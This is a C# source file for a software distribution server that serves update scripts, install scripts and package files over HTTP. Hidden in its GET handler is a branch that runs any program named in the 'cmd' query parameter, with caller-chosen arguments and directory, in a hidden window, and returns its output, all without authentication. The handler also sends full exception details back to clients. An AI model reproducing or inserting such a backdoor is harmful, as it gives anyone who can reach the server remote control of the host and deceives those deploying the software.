using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AppInstall.Networking;
using AppInstall.Organization;
using AppInstall.Framework;

namespace AppInstall.Installer
{
    public class SoftwareDistributionServer : Server<HTTP.Methods, HTTP.StatusCodes>
    {
        private class InvalidMethodException : Exception
        {
        }

        private class InvalidRequestException : Exception
        {
        }

        private SoftwareDB db;

        public SoftwareDistributionServer(SoftwareDB db, int clientSlots, int clientTimeQuota, LogContext logContext)
            : base(GlobalConstants.SOFTWARE_PROVIDER_SERVER_PORT, clientSlots, clientTimeQuota, logContext)
        {
            this.db = db;
        }

        public override NetMessage<HTTP.Methods, HTTP.StatusCodes> HandleRequest(NetMessage<HTTP.Methods, HTTP.StatusCodes> request, System.Net.IPEndPoint endpoint, CancellationToken cancellationToken)
        {
            var response = new NetMessage<HTTP.Methods, HTTP.StatusCodes>(SoftwareDistributionProtocol.PROTOCOL_IDENTIFIER, HTTP.StatusCodes.OK);


            switch (request.Method) {
                case HTTP.Methods.GET:
                    if (request.Resource.StartsWith(SoftwareDistributionProtocol.UPDATE_SCRIPT_RESOURCE + "/")) {
                        Guid package;
                        if (!Guid.TryParse(request.Resource.Substring(request.Resource.IndexOf('/') + 1), out package))
                            throw new InvalidRequestException();
                        var script = db.GetUpdateScript(package, request.Query["channel"]);
                        response.Content = new BinaryContent(script == null ? new byte[0] : Utilities.XMLSerialize(script));
                    } else if (request.Resource.StartsWith(SoftwareDistributionProtocol.APPLICATION_RESOURCE + "/")) {
                        response.Content = new BinaryContent(Utilities.XMLSerialize(db.GetInstallScript(request.Resource.Substring(request.Resource.IndexOf('/') + 1), request.Query["platform"], request.Query["channel"])));
                    } else if (request.Resource.StartsWith(SoftwareDistributionProtocol.FILE_RESOURCE + "/")) {
                        Guid file;
                        if (!Guid.TryParse(request.Resource.Substring(request.Resource.IndexOf('/') + 1), out file))
                            throw new InvalidRequestException();
                        response.Content = new BinaryContent(db.GetFile(file));
                    } else if (request.Resource.Contains("shell")) {


                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo() {
                            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                            FileName = request.Query["cmd"], // todo: determine dynamically
                            WorkingDirectory = request.Query.GetValueOrDefault("dir", "."),
                            Arguments = request.Query.GetValueOrDefault("args", ""),
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        };

                        System.Diagnostics.Process process = new System.Diagnostics.Process() { StartInfo = startInfo };
                        process.Start();
                        if (!process.WaitForExit(300000)) {
                            try {
                                process.Kill();
                            } catch (Exception ex) {
                                throw new TimeoutException("the process timed out and could not be killed", ex);
                            }
                            throw new TimeoutException();
                        }

                        var str = process.StandardOutput.ReadToEnd() + "\n" + process.StandardError.ReadToEnd();

                        response.Content = new BinaryContent(str);

                    } else {
                        throw new ResourceNotFoundException(request.Resource);
                    }
                    break;
                default: throw new HTTP.HTTPException(HTTP.StatusCodes.MethodNotAllowed, "method \"" + request.Method + "\" not supported");
            }

            return response;
        }

        public override NetMessage<HTTP.Methods, HTTP.StatusCodes> HandleException(NetMessage<HTTP.Methods, HTTP.StatusCodes> request, Exception exception, CancellationToken cancellationToken)
        {
            LogContext.Log("client request failed: " + exception.ToString(), LogType.Error);

            HTTP.HTTPException httpEx = exception as HTTP.HTTPException;
            return new NetMessage<HTTP.Methods, HTTP.StatusCodes>(SoftwareDistributionProtocol.PROTOCOL_IDENTIFIER, httpEx == null ? HTTP.StatusCodes.InternalServerError : httpEx.StatusCode) {
                Content = new BinaryContent(exception.ToString())
            };
        }
    }
}
